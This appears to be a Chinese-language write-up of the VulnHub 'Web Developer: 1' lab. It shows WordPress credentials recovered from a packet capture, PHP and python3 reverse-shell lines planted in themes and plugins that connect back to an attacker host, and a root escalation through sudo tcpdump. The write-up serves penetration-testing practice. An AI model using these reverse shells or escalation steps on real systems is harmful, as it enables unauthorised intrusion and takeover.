# Web Developer: 1

2024-5-1 https://www.vulnhub.com/entry/web-developer-1,288/

difficulty: not know

## IP

192.168.5.24

## Scan

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d2ac734c17ec6a8279875af922d412cb (RSA)
|   256 9cd5f32ce2d006cc8c155a5a815b033d (ECDSA)
|_  256 ab67566927ea3e3b337332f8ff2e1f20 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Example site &#8211; Just another WordPress site
|_http-generator: WordPress 4.9.8
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

只开放了 2 个端口，22 端口 banner 没什么提示信息。

80 web 端口为 WordPress，攻击向量很多。先进行下目录扫描，看看有没有什么隐藏目录：

```
gobuster dir -t 64 -e -r -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 403,404,405 -x php,txt,html -u http://192.168.5.24/

http://192.168.5.24/ipdata               (Status: 200) [Size: 944]
http://192.168.5.24/license.txt          (Status: 200) [Size: 19935]
http://192.168.5.24/readme.html          (Status: 200) [Size: 7415]
http://192.168.5.24/wp-includes          (Status: 200) [Size: 41067]
http://192.168.5.24/wp-content           (Status: 200) [Size: 0]
http://192.168.5.24/wp-cron.php          (Status: 200) [Size: 0]
http://192.168.5.24/wp-blog-header.php   (Status: 200) [Size: 0]
http://192.168.5.24/wp-links-opml.php    (Status: 200) [Size: 222]
http://192.168.5.24/wp-load.php          (Status: 200) [Size: 0]
http://192.168.5.24/wp-login.php         (Status: 200) [Size: 2160]
http://192.168.5.24/wp-config.php        (Status: 200) [Size: 0]
http://192.168.5.24/index.php            (Status: 200) [Size: 52813]
http://192.168.5.24/index.php            (Status: 200) [Size: 52813]
http://192.168.5.24/wp-trackback.php     (Status: 200) [Size: 135]
http://192.168.5.24/wp-admin             (Status: 200) [Size: 2179]
http://192.168.5.24/wp-signup.php        (Status: 200) [Size: 2302]
```

http://192.168.5.24/ipdata 为除了 wordpress 之外的目录，目录中有一个 analyze.cap 文件，是一个网络抓包文件，wireshark 打开，看看有没有密码等信息，追踪流后发现了 POST 登陆的信息：

```
POST /wordpress/wp-login.php HTTP/1.1
Host: 192.168.1.176
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.176/wordpress/wp-login.php?redirect_to=http%3A%2F%2F192.168.1.176%2Fwordpress%2Fwp-admin%2F&reauth=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 152
Cookie: wordpress_test_cookie=WP+Cookie+check
Connection: keep-alive
Upgrade-Insecure-Requests: 1

log=webdeveloper&pwd=Te5eQg%264sBS%21Yr%24%29wf%25%28DcAd&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.1.176%2Fwordpress%2Fwp-admin%2F&testcookie=1HTTP/1.1 302 Found
```

可以看到用户凭证为：webdeveloper:Te5eQg&4sBS!Yr$)wf%(DcAd 尝试用此凭据进行登陆，登陆成功，看到 webdeveloper 是 Administrator 权限。

下一步，在 wp 中插入 web shell，反弹到 kali 中。

### 反弹 1：

通过编辑 theme，发现 twenty sixteen 可以在更改 php 代码后进行保存，所以切换到该主题。编辑 404.php 把我们的后门代码写入其中，然后访问 http://192.168.5.24/wp-content/themes/twentysixteen/404.php 触发反弹代码。

### 反弹 2：

修改插件页面的源代码，在 http://192.168.5.24/wp-admin/plugin-editor.php 下的页面 akismet/akismet.php 中插入 php 反弹代码：

```
$sock=fsockopen("192.168.5.10",8888);$proc=proc_open("/bin/bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
```

kali 上建立 8888 监听，然后访问 http://192.168.5.24/wp-content/plugins/akismet/akismet.php 或者在 插件页面 Active 插件也能激活反弹代码，在 kali 上得到了反弹的 shell。

### 反弹 3：

在 Appearance->Add New->Upload Theme->文件上传，然后在 http://192.168.5.24/wp-content/uploads 中就能看到我们上传的 php 代码，点击反弹 shell 的连接，我们就能得到反弹的 shell。

先升级 tty，目标系统中装了 python3，使用它升级：python3 -c 'import pty; pty.spawn("/bin/bash")'

tty 正常后，开始对系统进行攻击向量的枚举。

先看看 wordpress 的数据库连接配置信息是什么：

```
cat /var/www/html/wp-config.php

define('DB_NAME', 'wordpress');
define('DB_USER', 'webdeveloper');
define('DB_PASSWORD', 'MasterOfTheUniverse');
define('DB_HOST', 'localhost');
```

查看 /etc/passwd 后发现用户：

```
webdeveloper:x:1000:1000:WebDeveloper:/home/webdeveloper:/bin/bash
```

尝试用上面得到的数据库密码，切换到该用户，切换成功，我们得到了一个普通用户权限。

sudo -l 看看有什么特权执行命令：

```
(root) /usr/sbin/tcpdump
```

GTFO 上找到利用的代码：

ip a s 先看看目标机器上有哪些网卡：eth0

```
COMMAND='python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.5.10",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\''
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo /usr/sbin/tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z $TF -Z root
```

最终在 kali 上获得了反弹的 root shell。
